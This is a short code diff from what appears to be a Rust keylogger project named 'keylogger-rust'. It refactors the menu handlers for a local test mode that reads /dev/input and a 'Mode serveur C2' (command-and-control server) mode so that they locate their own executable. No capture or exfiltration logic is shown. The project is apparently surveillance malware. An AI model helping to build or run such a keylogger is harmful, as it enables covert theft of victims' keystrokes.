@@ -1,6 +1,4 @@
-mod config;
 mod modules;
-
 use modules::key_manager::get_or_create_key;
 use std::io::{self, Write};
 use clap::{Parser, Subcommand};
@@ -57,8 +55,7 @@ fn main() {
             match ans {
                 Ok(choice) => match choice {
                     "Mode local test(/dev/input/)" => {
-                        let current_path = std::env::current_dir().unwrap();
-                        let binary_path = current_path.join("target/release/keylogger-rust");
+                        let binary_path = std::env::current_exe().unwrap();
 
                         Command::new("xterm")
                             .arg("-hold")
@@ -92,8 +89,7 @@ fn main() {
 			}
 
                     "Mode serveur C2" => {
-                        let current_path = std::env::current_dir().unwrap();
-                        let binary_path = current_path.join("target/release/keylogger-rust");
+                        let binary_path = std::env::current_exe().unwrap();
 
                         Command::new("xterm")
                             .arg("-hold")
